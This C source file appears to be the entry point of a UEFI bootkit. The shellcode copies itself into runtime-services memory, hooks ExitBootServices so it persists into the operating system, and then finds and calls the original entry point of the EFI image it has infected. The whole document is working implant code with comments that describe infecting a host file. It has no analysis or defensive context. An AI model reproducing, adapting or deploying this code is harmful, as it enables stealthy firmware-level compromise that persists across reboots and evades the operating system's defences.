#include "Common.h"

D_SEC( A ) EFI_STATUS EFIAPI EfiMain( _In_ EFI_HANDLE ImageHandle, _In_ EFI_SYSTEM_TABLE * SystemTable )
{
	SIZE_T			Len = 0;
	SIZE_T			Pct = 0;
	EFI_PHYSICAL_ADDRESS	Epa = 0;

	PEFTBL			Eft = NULL;
	PCONFIG			Cfg = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Calculate the complete length of the current shellcode */
	Len = ( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( EfiMain ) );

	/* Calculate the number of pages needed for the allocation */
	Pct = ( ( ( Len + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) ) / 0x1000 );

	/* Allocate the pages for the shellcode */
	if ( SystemTable->BootServices->AllocatePages( AllocateAnyPages, EfiRuntimeServicesData, Pct, &Epa ) == EFI_SUCCESS ) {

		/* Save a copy of the handler */
		Eft = C_PTR( G_PTR( EfTbl ) );
		Eft->ExitBootServices = C_PTR( SystemTable->BootServices->ExitBootServices );

		/* Copy over the shellcode */
		__builtin_memcpy( C_PTR( Epa ), C_PTR( G_PTR( EfiMain ) ), Len );

		/* Insert hooks into the handler */
		SystemTable->BootServices->ExitBootServices = C_PTR( U_PTR( Epa ) + ( G_PTR( ExitBootServicesHook ) - G_PTR( EfiMain ) ) );
	};

	if ( ImageHandle != NULL ) {
		/* Locate the 'Leave' symbol @ GetIp */
		Cfg = C_PTR( U_PTR( GetIp() ) + 11 );

		/* Get the EfiMain symbol */
		Dos = C_PTR( G_PTR( EfiMain ) );
		Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x20 - 1 ) ) );

		do 
		{
			/* Has the MZ Stub? */
			if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
				/* Patch the specified e_lfanew? */
				if ( Dos->e_lfanew == Cfg->AddressOfNewExeHeader ) {
					/* Get a pointer to the NT header */
					Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

					/* Is our NT header? */
					if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
						/* Yes! Abort! */
						break;
					};
				};
			};
			/* Decrement */
			Dos = C_PTR( U_PTR( Dos ) - 0x20 );
		} while ( TRUE );

		/* Execute EfiMain of the infected file */
		return ( ( __typeof__( EfiMain ) * ) C_PTR( U_PTR( Dos ) + Cfg->AddressOfEntrypoint ) )(
				ImageHandle, SystemTable
		);
	};
	return EFI_SUCCESS;
};
